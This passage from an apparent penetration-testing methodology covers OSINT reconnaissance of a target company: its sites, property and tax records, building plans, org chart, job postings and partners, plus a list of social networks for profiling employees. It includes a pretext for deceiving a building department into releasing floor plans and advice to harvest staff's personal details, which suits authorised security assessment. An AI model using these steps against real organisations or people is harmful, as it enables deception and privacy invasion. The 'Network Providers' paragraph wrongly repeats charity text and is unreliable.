</tbody>
</table>
</div>
<div class="section" id="physical">
<h4>Physical<a class="headerlink" href="#physical" title="Permalink to this headline">¶</a></h4>
<p>Often the first step in OSINT is to identify the physical locations of
the target corporation. This information might be readily available for
publically known or published locations, but not quite so easy for more
secretive sites. Public sites can often be location by using search
engines such as:</p>
<ul class="simple">
<li>Google -<a class="reference external" href="http://www.google.com/">http://www.google.com</a></li>
<li>Yahoo - <a class="reference external" href="http://yahoo.com/">http://yahoo.com</a></li>
<li>Bing - <a class="reference external" href="http://www.bing.com/">http://www.bing.com</a></li>
<li>Ask.com - <a class="reference external" href="http://ask.com/">http://ask.com</a></li>
</ul>
<div class="section" id="locations">
<h5>Locations<a class="headerlink" href="#locations" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="shared-individual">
<h5>Shared/Individual<a class="headerlink" href="#shared-individual" title="Permalink to this headline">¶</a></h5>
<p>As part of identifying the physical location it is important to note if
the location is an individual building or simply a suite in a larger
facility. It is important to attempt to identify neighboring businesses
as well as common areas.</p>
</div>
<div class="section" id="owner">
<h5>Owner<a class="headerlink" href="#owner" title="Permalink to this headline">¶</a></h5>
<p>Once the physical locations have been identified, it is useful to
identify the actual property owner(s). This can either be an individual,
group, or corporation. If the target corporation does not own the
property then they may be limited in what they can physically do to
enhance or improve the physical location.</p>
<p>Land/tax records</p>
<p>Tax records:</p>
<p><a class="reference external" href="http://www.naco.org/Counties/Pages/CitySearch.aspx">http://www.naco.org/Counties/Pages/CitySearch.aspx</a></p>
<p>Land and tax records generally include a wealth of information on a
target such as ownership, possession, mortgage companies, foreclosure
notices, photographs and more. The information recorded and level of
transparency varies greatly by jurisdiction. Land and tax records within
the United States are typically handled at the county level.</p>
<p>To start, if you know the city or zipcode in which your target resides,
use a site such as <a class="reference external" href="http://publicrecords.netronline.com/">http://publicrecords.netronline.com/</a> to determine
which county that is in. Then switching over to Google you can use a
query such as &#8220;XXXX county tax records&#8221;, &#8220;XXXX county recording office&#8221;
or &#8220;XXXX county assessor&#8221; and that should lead you to a searchable
online database if one exists. If it does not exist, you can still call
the county recording office and request that they fax you specific
records if you have an idea of what you are looking for.</p>
<p>Building department:</p>
<p>For some assessments, it might make sense to go a step further and query
the local building department for additional information. Depending on
the city, the target&#8217;s site might be under county or city jurisdiction.
Typically that can be determined by a call to either entity.</p>
<p>The building department generally has floor plans, old &amp; current
permits, tenant improvement information and other similar information on
file. Buried in that information might be names of contracting firms,
engineers, architects and more. All of which could be used with a tool
such as SET. In most cases, a phone call will be required to obtain any
of this information but most building departments are happy to hand it
out to anyone who asks.</p>
<p>Here is a possible pretext you could use to obtain floor plans: You
could call up and say that you are an architectural consultant who has
been hired to design a remodel or addition to the building and it would
help the process go much smoother if you could get a copy of the
original plans.</p>
</div>
</div>
<div class="section" id="datacenter-locations">
<h4>Datacenter Locations<a class="headerlink" href="#datacenter-locations" title="Permalink to this headline">¶</a></h4>
<p>Identifying any target business data center locations via either the
corporate website, public filings, land records or via a search engine
can provide additional potential targets.</p>
<div class="section" id="time-zones">
<h5>Time zones<a class="headerlink" href="#time-zones" title="Permalink to this headline">¶</a></h5>
<p>Identifying the time zones that the target operates in provides valuable
information regarding the hours of operation. It is also significant to
understand the relationship between the target time zone and that of the
assessment team. A time zone map is often useful as a reference when
conducting any test.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_02.png">TimeZone Map</a></p>
</div>
<div class="section" id="offsite-gathering">
<h5>Offsite gathering<a class="headerlink" href="#offsite-gathering" title="Permalink to this headline">¶</a></h5>
<p>Identifying any recent or future offsite gatherings or parties via
either the corporate website or via a search engine can provide valuable
insight into the corporate culture of a target. It is often common
practice for businesses to have offsite gatherings not only for
employees, but also for business partners and customers. Collecting this
data could provide insight into potential items of interest to an
attacker.</p>
</div>
<div class="section" id="product-services">
<h5>Product/Services<a class="headerlink" href="#product-services" title="Permalink to this headline">¶</a></h5>
<p>Identifying the target business products and any significant data
related to such launches via the corporate website, new releases or via
a search engine can provide valuable insight into the internal workings
of a target. It is often common practice for businesses to make such
notifications publicly in an effort to garner publicity and to inform
current and/or new customers of the launch. Publicly available
information includes, but is not limited to, foreign language documents,
radio and television broadcasts, Internet sites, and public speaking.</p>
</div>
<div class="section" id="company-dates">
<h5>Company Dates<a class="headerlink" href="#company-dates" title="Permalink to this headline">¶</a></h5>
<p>Significant company dates can provide insight into potential days where
staff may be on alert higher than normal. This could be due to potential
corporate meetings, board meetings, investor meetings, or corporate
anniversary. Normally, businesses that observe various holidays have a
significantly reduced staff and therefore targeting may prove to be much
more difficult during these periods.</p>
</div>
<div class="section" id="position-identification">
<h5>Position identification<a class="headerlink" href="#position-identification" title="Permalink to this headline">¶</a></h5>
<p>Within every target it is critical that you identify and document the
top positions within the organization. This is critical to ensure that
the resulting report is targeting the correct audience. At a minimum,
key employees should be identified as part of any engagement.</p>
</div>
<div class="section" id="organizational-chart">
<h5>Organizational Chart<a class="headerlink" href="#organizational-chart" title="Permalink to this headline">¶</a></h5>
<p>Understanding the organizational structure is important, not only to
understand the depth of the structure, but also the breadth. If the
organization is extremely large, it is possible that new staff or
personnel could go undetected. In smaller organizations, the likelihood
is not as great. Getting a good picture of this structure can also
provide insight into the functional groups. This information can be
useful in determining internal targets.</p>
</div>
<div class="section" id="corporate-communications">
<h5>Corporate Communications<a class="headerlink" href="#corporate-communications" title="Permalink to this headline">¶</a></h5>
<p>Identifying corporate communications either via the corporate website or
a job search engine can provide valuable insight into the internal
workings of a target.</p>
<p>Marketing</p>
<p>Marketing communications are often used to make corporate announcements
regarding currently, or future product releases, and partnerships.</p>
<p>Lawsuits</p>
<p>Communications regarding the targets involvement in litigation can
provide insight into potential threat agent or data of interest.</p>
<p>Transactions</p>
<p>Communications involving corporate transactions may be indirect response
to a marketing announcement or lawsuit.</p>
</div>
<div class="section" id="job-openings">
<h5>Job openings<a class="headerlink" href="#job-openings" title="Permalink to this headline">¶</a></h5>
<p>Searching current job openings or postings via either the corporate
website or via a job search engine can provide valuable insight into the
internal workings of a target. It is often common practice to include
information regarding currently, or future, technology implementations.
Collecting this data could provide insight into potential items of
interest to an attacker. Several Job Search Engines exist that can be
queried for information regarding the target.</p>
<table border="1" class="docutils">
<colgroup>
<col width="19%" />
<col width="81%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Site</strong></td>
<td><strong>URL</strong></td>
</tr>
<tr class="row-even"><td>Monster</td>
<td><a class="reference external" href="http://www.monster.com/">http://www.monster.com</a></td>
</tr>
<tr class="row-odd"><td>CareerBuilder</td>
<td><a class="reference external" href="http://www.careerbuilder.com/">http://www.careerbuilder.com</a></td>
</tr>
<tr class="row-even"><td>Computerjobs.com</td>
<td><a class="reference external" href="http://www.computerjobs.com/">http://www.computerjobs.com</a></td>
</tr>
<tr class="row-odd"><td>Craigslist</td>
<td><a class="reference external" href="http://www.craigslist.org/about/sites/">http://www.craigslist.org/about/sites</a></td>
</tr>
</tbody>
</table>
</div>
</div>
<div class="section" id="relationships">
<h4>Relationships<a class="headerlink" href="#relationships" title="Permalink to this headline">¶</a></h4>
<p>Identifying the targets logical relationships is critical to understand
more about how the business operates. Publicly available information
should be leveraged to determine the target business relationship with
vendors, business partners, law firms, etc. This is often available via
news releases, corporate web sites (target and vendors), and potentially
via industry related forums.</p>
<div class="section" id="charity-affiliations">
<h5>Charity Affiliations<a class="headerlink" href="#charity-affiliations" title="Permalink to this headline">¶</a></h5>
<p>Identifying any target business charity affiliations via either the
corporate website or via a search engine can provide valuable insight
into the internal workings and potentially the corporate culture of a
target. It is often common practice for businesses to make charitable
donations to various organizations. Collecting this data could provide
insight into potential items of interest to an attacker.</p>
</div>
<div class="section" id="network-providers">
<h5>Network Providers<a class="headerlink" href="#network-providers" title="Permalink to this headline">¶</a></h5>
<p>Identifying any network provisioning or providers either via the
allocated netblock /address information, corporate website or via a
search engine can provide valuable insight into the potentially of a
target. It is often common practice for businesses to make charitable
donations to various organizations. Collecting this data could provide
insight into potential items of interest to an attacker.</p>
</div>
<div class="section" id="business-partners">
<h5>Business Partners<a class="headerlink" href="#business-partners" title="Permalink to this headline">¶</a></h5>
<p>Identifying business partners is critical to gaining insight into not
only the corporate culture of a target, but also potentially
technologies being used. It is often common practice for businesses to
announce partnership agreements. Collecting this data could provide
insight into potential items of interest to an attacker.</p>
</div>
<div class="section" id="competitors">
<h5>Competitors<a class="headerlink" href="#competitors" title="Permalink to this headline">¶</a></h5>
<p>Identifying competitors can provide a window into potential adversaries.
It is not uncommon for competitors to announce news that could impact
the target. These could range from new hires, product launches, and even
partnership agreements. Collecting this data is important to fully
understand any potential corporate hostility.</p>
</div>
</div>
</div>
<div class="section" id="individuals">
<h3>Individuals<a class="headerlink" href="#individuals" title="Permalink to this headline">¶</a></h3>
<p>Social Networking Profile</p>
<p>The numbers of active Social Networking websites as well as the number
of users make this a prime location to identify employee&#8217;s friendships,
kinships, common interest, financial exchanges, likes/dislikes, sexual
relationships, or beliefs. It is even possible to determine an
employee&#8217;s corporate knowledge or prestige.</p>
<p>Social Networking Websites</p>
<table border="1" class="docutils">
<colgroup>
<col width="8%" />
<col width="26%" />
<col width="66%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Name</strong></td>
<td><strong>URL</strong></td>
<td><strong>Description/Focus</strong></td>
</tr>
<tr class="row-even"><td>Academia.edu</td>
<td><a class="reference external" href="http://www.academia.edu/">http://www.academia.edu</a></td>
<td>Social networking site for academics/researchers</td>
</tr>
<tr class="row-odd"><td>Advogato</td>
<td><a class="reference external" href="http://www.advogato.org/">http://www.advogato.org</a></td>
<td>Free and open source software developers</td>
</tr>
<tr class="row-even"><td>aNobii</td>
<td><a class="reference external" href="http://www.anobii.com/anobii_home">http://www.anobii.com/anobii_home</a></td>
<td>Books</td>
</tr>
<tr class="row-odd"><td>aSmallWorld</td>
<td><a class="reference external" href="http://www.asmallworld.net/">http://www.asmallworld.net</a></td>
<td>European jet set and social elite world-wide</td>
</tr>
<tr class="row-even"><td>AsianAvenue</td>
<td><a class="reference external" href="http://www.asianave.com/">http://www.asianave.com</a></td>
<td>A social network for the Asian American community</td>
</tr>
<tr class="row-odd"><td>Athlinks</td>
<td><a class="reference external" href="http://www.athlinks.com/">http://www.athlinks.com</a></td>
<td>Open Running, Swimming</td>
</tr>
<tr class="row-even"><td>Audimated.com</td>
<td><a class="reference external" href="http://www.audimated.com/">http://www.audimated.com</a></td>
<td>Independent Music</td>
</tr>
<tr class="row-odd"><td>Avatars United</td>
<td><a class="reference external" href="http://www.avatarsunited.com/">http://www.avatarsunited.com</a></td>
<td>Online games</td>
</tr>
<tr class="row-even"><td>Badoo</td>
<td><a class="reference external" href="http://badoo.com/">http://badoo.com</a></td>
<td>General, Meet new people, Popular in Europe and LatAm</td>
</tr>
<tr class="row-odd"><td>Bebo</td>
<td><a class="reference external" href="http://www.bebo.com/">http://www.bebo.com</a></td>
<td>General</td>
</tr>
<tr class="row-even"><td>Bigadda</td>
<td><a class="reference external" href="http://bigb.bigadda.com/">http://bigb.bigadda.com</a></td>
<td>Indian Social Networking Site</td>
</tr>
<tr class="row-odd"><td>Federated Media&#8217;s BigTent</td>
<td><a class="reference external" href="http://www.federatedmedia.net/">http://www.federatedmedia.net</a></td>
<td>Organization and communication portal for groups</td>
</tr>
<tr class="row-even"><td>Biip.no</td>
<td><a class="reference external" href="http://www.biip.no/">http://www.biip.no</a></td>
<td>Norwegian community</td>
</tr>
<tr class="row-odd"><td>BlackPlanet</td>
<td><a class="reference external" href="http://www.blackplanet.com/">http://www.blackplanet.com</a></td>
<td>African-Americans</td>
</tr>
<tr class="row-even"><td>Blauk</td>
<td><a class="reference external" href="http://blauk.com/">http://blauk.com</a></td>
<td>Anyone who wants to tell something about a stranger or acquaintance.</td>
</tr>
<tr class="row-odd"><td>Blogster</td>
<td><a class="reference external" href="http://www.blogster.com/">http://www.blogster.com</a></td>
<td>Blogging community</td>
</tr>
<tr class="row-even"><td>Bolt.com</td>
<td><a class="reference external" href="http://www.bolt.com/">http://www.bolt.com</a></td>
<td>General</td>
</tr>
<tr class="row-odd"><td>Buzznet</td>
<td><a class="reference external" href="http://www.buzznet.com/">http://www.buzznet.com</a></td>
<td>Music and pop-culture</td>
</tr>
<tr class="row-even"><td>CafeMom</td>
<td><a class="reference external" href="http://www.cafemom.com/">http://www.cafemom.com</a></td>
<td>Mothers</td>
</tr>
<tr class="row-odd"><td>Cake Financial</td>
<td><a class="reference external" href="http://www.cakefinancial.com/">http://www.cakefinancial.com</a></td>
<td>Investing</td>
</tr>
<tr class="row-even"><td>Care2</td>
<td><a class="reference external" href="http://www.care2.com/">http://www.care2.com</a></td>
<td>Green living and social activism</td>
</tr>
<tr class="row-odd"><td>CaringBridge</td>
<td><a class="reference external" href="http://www.caringbridge.org/">http://www.caringbridge.org</a></td>
<td>Not for profit providing free websites that connect family and friends during a serious health event, care and recovery.</td>
</tr>
<tr class="row-even"><td>Cellufun</td>
<td><a class="reference external" href="http://m.cellufun.com/">http://m.cellufun.com</a></td>
<td>Mobile social game network, Number 8 US mobile website</td>
</tr>
<tr class="row-odd"><td>Classmates.com</td>
<td><a class="reference external" href="http://www.classmates.com/">http://www.classmates.com</a></td>
<td>School, college, work and the military</td>
</tr>
<tr class="row-even"><td>Cloob</td>
<td><a class="reference external" href="http://www.cloob.com/">http://www.cloob.com</a></td>
<td>General. Popular in Iran</td>
</tr>
<tr class="row-odd"><td>CouchSurfing</td>
<td><a class="reference external" href="http://www.couchsurfing.org/">http://www.couchsurfing.org</a></td>
<td>Worldwide network for making connections between travelers and the local communities they visit.</td>
</tr>
<tr class="row-even"><td>CozyCot</td>
<td><a class="reference external" href="http://www.cozycot.com/">http://www.cozycot.com</a></td>
<td>East Asian and Southeast Asian women</td>
</tr>
<tr class="row-odd"><td>Cross.tv</td>
<td><a class="reference external" href="http://www.cross.tv/">http://www.cross.tv</a></td>
<td>Faith Based social network for Christian believers from around the world</td>
</tr>
<tr class="row-even"><td>Crunchyroll</td>
<td><a class="reference external" href="http://www.crunchyroll.com/">http://www.crunchyroll.com</a></td>
<td>Anime and forums.</td>
</tr>
<tr class="row-odd"><td>Cyworld</td>
<td><div class="first last line-block">
<div class="line">(Korea) <a class="reference external" href="http://cyworld.co.kr/">http://cyworld.co.kr</a></div>
<div class="line">(China) <a class="reference external" href="http://www.cyworld.com.cn/">http://www.cyworld.com.cn</a></div>
</div>
</td>
<td>General. Popular in South Korea.</td>
</tr>
<tr class="row-even"><td>DailyBooth</td>
<td><a class="reference external" href="http://dailybooth.com/">http://dailybooth.com</a></td>
<td>Photo-blogging site where users upload a photo every day</td>
</tr>
<tr class="row-odd"><td>DailyStrength</td>
<td><a class="reference external" href="http://www.dailystrength.org/">http://www.dailystrength.org</a></td>
<td>Medical &amp; emotional support community - Physical health, Mental health, Support groups</td>
</tr>
<tr class="row-even"><td>Decayenne</td>
<td><a class="reference external" href="http://www.decayenne.com/">http://www.decayenne.com</a></td>
<td>European and American social elite</td>
</tr>
<tr class="row-odd"><td>delicious</td>
<td><a class="reference external" href="http://www.delicious.com/">http://www.delicious.com</a></td>
<td>Social bookmarking allowing users to locate and save websites that match their own interests</td>
</tr>
<tr class="row-even"><td>deviantART</td>
<td><a class="reference external" href="http://www.deviantart.com/">http://www.deviantart.com</a></td>
<td>Art community</td>
</tr>
<tr class="row-odd"><td>Disaboom</td>
<td><a class="reference external" href="http://www.disaboom.com/">http://www.disaboom.com</a></td>
<td>People with disabilities (Amputee, cerebral palsy, MS, and other disabilities)</td>
</tr>
<tr class="row-even"><td>Dol2day</td>
<td><a class="reference external" href="http://www.dol2day.de/">http://www.dol2day.de</a></td>
<td>Politic community, Social network, Internet radio (German-speaking countries)</td>
</tr>
<tr class="row-odd"><td>DontStayIn</td>
<td><a class="reference external" href="http://www.dontstayin.com/">http://www.dontstayin.com</a></td>
<td>Clubbing (primarily UK)</td>
</tr>
<tr class="row-even"><td>Draugiem.lv</td>
<td><a class="reference external" href="http://www.draugiem.lv/">http://www.draugiem.lv</a></td>
<td>General (primarily LV, LT, HU)</td>
</tr>
<tr class="row-odd"><td>douban</td>
<td><a class="reference external" href="http://www.douban.com/">http://www.douban.com</a></td>
<td>Chinese Web 2.0 website providing user review and recommendation services for movies, books, and music. It is also the largest online Chinese language book, movie and music database and one of the largest online communities in China.</td>
</tr>
<tr class="row-even"><td>Elftown</td>
<td><a class="reference external" href="http://www.elftown.com/">http://www.elftown.com</a></td>
<td>Community and wiki around Fantasy and sci-fi.</td>
</tr>
<tr class="row-odd"><td>Entitycube</td>
<td><a class="reference external" href="http://entitycube.research.microsoft.com/">http://entitycube.research.microsoft.com</a></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Eons.com</td>
<td><a class="reference external" href="http://www.eons.com/">http://www.eons.com</a></td>
<td>For baby boomers</td>
</tr>
<tr class="row-odd"><td>Epernicus</td>
<td><a class="reference external" href="http://www.epernicus.com/">http://www.epernicus.com</a></td>
<td>For research scientists</td>
</tr>
<tr class="row-even"><td>Experience Project</td>
<td><a class="reference external" href="http://www.experienceproject.com/">http://www.experienceproject.com</a></td>
<td>Life experiences</td>
</tr>
<tr class="row-odd"><td>Exploroo</td>
<td><a class="reference external" href="http://www.exploroo.com/">http://www.exploroo.com</a></td>
<td>Travel Social Networking.</td>
</tr>
<tr class="row-even"><td>Facebook</td>
<td><div class="first last line-block">
<div class="line">(IPv4) <a class="reference external" href="http://www.facebook.com/">http://www.facebook.com</a></div>
<div class="line">(IPv6) <a class="reference external" href="http://www.v6.facebook.com/">http://www.v6.facebook.com</a></div>
</div>
</td>
<td>General.</td>
</tr>
<tr class="row-odd"><td>Faceparty</td>
<td><a class="reference external" href="http://www.faceparty.com/">http://www.faceparty.com</a></td>
<td>General. Popular UK.</td>
</tr>
<tr class="row-even"><td>Faces.com</td>
<td><div class="first last line-block">
<div class="line"><a class="reference external" href="http://www.face-pic.com/">http://www.face-pic.com</a></div>
<div class="line"><a class="reference external" href="http://www.faces.com/">http://www.faces.com</a></div>
</div>
</td>
<td>British teens</td>
</tr>
<tr class="row-odd"><td>Fetlife</td>
<td><a class="reference external" href="http://fetlife.com/">http://fetlife.com</a></td>
<td>People who are into BDSM</td>
</tr>
<tr class="row-even"><td>FilmAffinity</td>
<td><a class="reference external" href="http://www.filmaffinity.com/">http://www.filmaffinity.com</a></td>
<td>Movies and TV Series</td>
</tr>
<tr class="row-odd"><td>FitFinder</td>
<td><a class="reference external" href="http://www.thefitfinder.co.uk/">http://www.thefitfinder.co.uk</a></td>
<td>Anonymous UK Student Microblogging Website</td>
</tr>
<tr class="row-even"><td>FledgeWing</td>
<td><a class="reference external" href="http://www.fledgewing.com/">http://www.fledgewing.com</a></td>
<td>Entrepreneural community targeted towards worldwide university students</td>
</tr>
<tr class="row-odd"><td>Flixster</td>
<td><a class="reference external" href="http://www.flixster.com/">http://www.flixster.com</a></td>
<td>Movies</td>
</tr>
<tr class="row-even"><td>Flickr</td>
<td><a class="reference external" href="http://www.flickr.com/">http://www.flickr.com</a></td>
<td>Photo sharing, commenting, photography related networking, worldwide</td>
</tr>
<tr class="row-odd"><td>Focus.com</td>
<td><a class="reference external" href="http://www.focus.com/">http://www.focus.com</a></td>
<td>Business to Business, worldwide</td>
</tr>
<tr class="row-even"><td>Folkdirect</td>
<td><a class="reference external" href="http://www.folkdirect.com/">http://www.folkdirect.com</a></td>
<td>General</td>
</tr>
<tr class="row-odd"><td>Fotki</td>
<td><a class="reference external" href="http://www.fotki.com/">http://www.fotki.com</a></td>
<td>Photo sharing, video hosting, photo contests, journals, forums, flexible privacy protection, friend&#8217;s feed, audio comments and unlimited custom design integration.</td>
</tr>
<tr class="row-even"><td>Fotolog</td>
<td><a class="reference external" href="http://www.fotolog.com/">http://www.fotolog.com</a></td>
<td>Photoblogging. Popular in South America and Spain</td>
</tr>
<tr class="row-odd"><td>Foursquare</td>
<td><a class="reference external" href="http://foursquare.com/">http://foursquare.com</a></td>
<td>Location based mobile social network</td>
</tr>
<tr class="row-even"><td>Friends Reunited</td>
<td><a class="reference external" href="http://www.friendsreunited.com/">http://www.friendsreunited.com</a></td>
<td>UK based. School, college, work, sport and streets</td>
</tr>
<tr class="row-odd"><td>Friendster</td>
<td><a class="reference external" href="http://www.friendster.com/">http://www.friendster.com</a></td>
<td>General. Popular in Southeast Asia. No longer popular in the western world</td>
</tr>
<tr class="row-even"><td>Fr¸hst¸ckstreff</td>
<td><a class="reference external" href="http://www.fruehstueckstreff.de/">http://www.fruehstueckstreff.de</a></td>
<td>General</td>
</tr>
<tr class="row-odd"><td>Fubar</td>
<td><a class="reference external" href="http://www.fubar.com/">http://www.fubar.com</a></td>
<td>dating, an &#8220;online bar&#8221; for 18 and older</td>
</tr>
<tr class="row-even"><td>Gaia Online</td>
<td><a class="reference external" href="http://www.gaiaonline.com/">http://www.gaiaonline.com</a></td>
<td>Anime and games. Popular in USA, Canada and Europe. Moderately popular around Asia.</td>
</tr>
<tr class="row-odd"><td>GamerDNA</td>
<td><a class="reference external" href="http://www.gamerdna.com/">http://www.gamerdna.com</a></td>
<td>Computer and video games</td>
</tr>
<tr class="row-even"><td>Gather.com</td>
<td><a class="reference external" href="http://home.gather.com/">http://home.gather.com</a></td>
<td>Article, picture, and video sharing, as well as group discussions</td>
</tr>
<tr class="row-odd"><td>Gays.com</td>
<td><a class="reference external" href="http://gays.com/">http://gays.com</a></td>
<td>Social network for LGBT community, Guide for LGBT bars, restaurants, clubs, shopping</td>
</tr>
<tr class="row-even"><td>Geni.com</td>
<td><a class="reference external" href="http://www.geni.com/">http://www.geni.com</a></td>
<td>Families, genealogy</td>
</tr>
<tr class="row-odd"><td>Gogoyoko</td>
<td><a class="reference external" href="http://www.gogoyoko.com/">http://www.gogoyoko.com</a></td>
<td>Fair play in Music - Social networking site for musicians and music lovers</td>
</tr>
<tr class="row-even"><td>Goodreads</td>
<td><a class="reference external" href="http://www.goodreads.com/">http://www.goodreads.com</a></td>
<td>Library cataloging, book lovers</td>
</tr>
<tr class="row-odd"><td>Goodwizz</td>
<td><a class="reference external" href="http://www.goodwizz.com/">http://www.goodwizz.com</a></td>
<td>Social network with matchmaking and personality games to find new contacts. Global, based in France.</td>
</tr>
<tr class="row-even"><td>Google Buzz</td>
<td><a class="reference external" href="http://www.google.com/buzz">http://www.google.com/buzz</a></td>
<td>General</td>
</tr>
<tr class="row-odd"><td>Google+</td>
<td><a class="reference external" href="http://plus.google.com/">http://plus.google.com</a></td>
<td>General</td>
</tr>
<tr class="row-even"><td>GovLoop</td>
<td><a class="reference external" href="http://www.govloop.com/">http://www.govloop.com</a></td>
<td>For people in and around government</td>
</tr>
<tr class="row-odd"><td>Gowalla</td>
<td><a class="reference external" href="http://gowalla.com/">http://gowalla.com</a></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Grono.net</td>
<td><a class="reference external" href="http://grono.net/">http://grono.net</a></td>
<td>Poland</td>
</tr>
<tr class="row-odd"><td>Habbo</td>
<td><a class="reference external" href="http://www.habbo.com/">http://www.habbo.com</a></td>
<td>General for teens. Over 31 communities worldwide. Chat Room and user profiles.</td>
</tr>
<tr class="row-even"><td>hi5</td>
<td><a class="reference external" href="http://hi5.com/">http://hi5.com</a></td>
<td>General. Popular in India, Mongolia, Thailand, Romania, Jamaica, Central Africa, Portugal and Latin America. Not very popular in the USA.</td>
</tr>
<tr class="row-odd"><td>Hospitality Club</td>
<td><a class="reference external" href="http://www.hospitalityclub.org/">http://www.hospitalityclub.org</a></td>
<td>Hospitality</td>
</tr>
<tr class="row-even"><td>Hotlist</td>
<td><a class="reference external" href="http://www.thehotlist.com/">http://www.thehotlist.com</a></td>
<td>Geo-Social Aggregator rooted in the concept of knowing where your friends are, were, and will be.</td>
</tr>
<tr class="row-odd"><td>HR.com</td>
<td><a class="reference external" href="http://www.hr.com/">http://www.hr.com</a></td>
<td>Social networking site for Human Resources professionals</td>
</tr>
<tr class="row-even"><td>Hub Culture</td>
<td><a class="reference external" href="http://www.hubculture.com/">http://www.hubculture.com</a></td>
<td>Global influencers focused on worth creation</td>
</tr>
<tr class="row-odd"><td>Hyves</td>
<td><a class="reference external" href="http://www.hyves.nl/">http://www.hyves.nl</a></td>
<td>General, Most popular in the Netherlands.</td>
</tr>
<tr class="row-even"><td>Ibibo</td>
<td><a class="reference external" href="http://www.ibibo.com/">http://www.ibibo.com</a></td>
<td>Talent based social networking site that allows to promote one&#8217;s self and also discover new talent. Most popular in India.</td>
</tr>
<tr class="row-odd"><td>Identi.ca</td>
<td><a class="reference external" href="http://identi.ca/">http://identi.ca</a></td>
<td>Twitter-like service popular with hackers and software freedom advocates.</td>
</tr>
<tr class="row-even"><td>Indaba Music</td>
<td><a class="reference external" href="http://www.indabamusic.com/">http://www.indabamusic.com</a></td>
<td>Online collaboration for musicians, remix contests, and networking.</td>
</tr>
<tr class="row-odd"><td>IRC-Galleria</td>
<td><a class="reference external" href="http://www.irc-galleria.net/">http://www.irc-galleria.net</a></td>
<td>Finland</td>
</tr>
<tr class="row-even"><td>italki.com</td>
<td><a class="reference external" href="http://www.italki.com/">http://www.italki.com</a></td>
<td>Language learning social network. 100+ languages.</td>
</tr>
<tr class="row-odd"><td>InterNations</td>
<td><a class="reference external" href="http://www.internations.org/">http://www.internations.org</a></td>
<td>International community</td>
</tr>
<tr class="row-even"><td>Itsmy</td>
<td><a class="reference external" href="http://mobile.itsmy.com/">http://mobile.itsmy.com</a></td>
<td>Mobile community worldwide, blogging, friends, personal TV-shows</td>
</tr>
<tr class="row-odd"><td>iWiW</td>
<td><a class="reference external" href="http://iwiw.hu/">http://iwiw.hu</a></td>
<td>Hungary</td>
</tr>
<tr class="row-even"><td>Jaiku</td>
<td><a class="reference external" href="http://www.jaiku.com/">http://www.jaiku.com</a></td>
<td>General. Microblogging. Owned by Google</td>
</tr>
<tr class="row-odd"><td>JammerDirect.com</td>
<td><a class="reference external" href="http://www.jammerdirect.com/">http://www.jammerdirect.com</a></td>
<td>Network for unsigned artists</td>
</tr>
<tr class="row-even"><td>kaioo</td>
<td><a class="reference external" href="http://www.kaioo.com/">http://www.kaioo.com</a></td>
<td>General, nonprofit</td>
</tr>
<tr class="row-odd"><td>Kaixin001</td>
<td><a class="reference external" href="http://www.kaixin001.com/">http://www.kaixin001.com</a></td>
<td>General. In Simplified Chinese; caters for mainland China users</td>
</tr>
<tr class="row-even"><td>Kiwibox</td>
<td><a class="reference external" href="http://www.kiwibox.com/">http://www.kiwibox.com</a></td>
<td>General. For the users, by the users, a social network that is more than a community.</td>
</tr>
<tr class="row-odd"><td>Lafango</td>
<td><a class="reference external" href="http://lafango.com/">http://lafango.com</a></td>
<td>Talent-Focused media sharing site</td>
</tr>
<tr class="row-even"><td>Last.fm</td>
<td><a class="reference external" href="http://www.last.fm/">http://www.last.fm</a></td>
<td>Music</td>
</tr>
<tr class="row-odd"><td>LibraryThing</td>
<td><div class="first last line-block">
<div class="line"><a class="reference external" href="http://www.librarything.com/">http://www.librarything.com/</a></div>
<div class="line">(German) <a class="reference external" href="http://www.librarything.de/">http://www.librarything.de</a></div>
</div>
</td>
<td>Book lovers</td>
</tr>
<tr class="row-even"><td>Lifeknot</td>
<td><a class="reference external" href="http://www.lifeknot.com/">http://www.lifeknot.com</a></td>
<td>Shared interests, hobbies</td>
</tr>
<tr class="row-odd"><td>LinkedIn</td>
<td><a class="reference external" href="http://www.linkedin.com/">http://www.linkedin.com</a></td>
<td>Business and professional networking</td>
</tr>
<tr class="row-even"><td>LinkExpats</td>
<td><a class="reference external" href="http://www.linkexpats.com/">http://www.linkexpats.com</a></td>
<td>Social networking website for expatriates. 100+ countries.</td>
</tr>
<tr class="row-odd"><td>Listography</td>
<td><a class="reference external" href="http://listography.com/">http://listography.com</a></td>
<td>Lists. Autobiography</td>
</tr>
<tr class="row-even"><td>LiveJournal</td>
<td><a class="reference external" href="http://www.livejournal.com/">http://www.livejournal.com</a></td>
<td>Blogging. Popular in Russia and among the Russian-speaking diaspora abroad.</td>
</tr>
<tr class="row-odd"><td>Livemocha</td>
<td><a class="reference external" href="http://www.livemocha.com/">http://www.livemocha.com</a></td>
<td>Online language learning - dynamic online courses in 35 languages - world&#8217;s largest community of native language speakers.</td>
</tr>
<tr class="row-even"><td>LunarStorm</td>
<td><a class="reference external" href="http://www.lunarstorm.se/">http://www.lunarstorm.se</a></td>
<td>Sweden</td>
</tr>
<tr class="row-odd"><td>MEETin</td>
<td><a class="reference external" href="http://www.meetin.org/">http://www.meetin.org</a></td>
<td>General</td>
</tr>
<tr class="row-even"><td>Meetup.com</td>
<td><a class="reference external" href="http://www.meetup.com/">http://www.meetup.com</a></td>
<td>General. Used to plan offline meetings for people interested in various activities</td>
</tr>
<tr class="row-odd"><td>Meettheboss</td>
<td><a class="reference external" href="http://www.meettheboss.tv/">http://www.meettheboss.tv</a></td>
<td>Business and Finance community, worldwide.</td>
</tr>
<tr class="row-even"><td>Mixi</td>
<td><a class="reference external" href="http://www.mixi.jp/">http://www.mixi.jp</a></td>
<td>Japan</td>
</tr>
<tr class="row-odd"><td>mobikade</td>
<td><a class="reference external" href="http://www.mkade.com/">http://www.mkade.com</a></td>
<td>mobile community, UK only</td>
</tr>
<tr class="row-even"><td>MocoSpace</td>
<td><a class="reference external" href="http://www.mocospace.com/">http://www.mocospace.com</a></td>
<td>mobile community, worldwide</td>
</tr>
<tr class="row-odd"><td>MOG</td>
<td><a class="reference external" href="http://www.mog.com/">http://www.mog.com</a></td>
<td>Music</td>
</tr>
<tr class="row-even"><td>MouthShut.com</td>
<td><a class="reference external" href="http://www.mouthshut.com/">http://www.mouthshut.com</a></td>
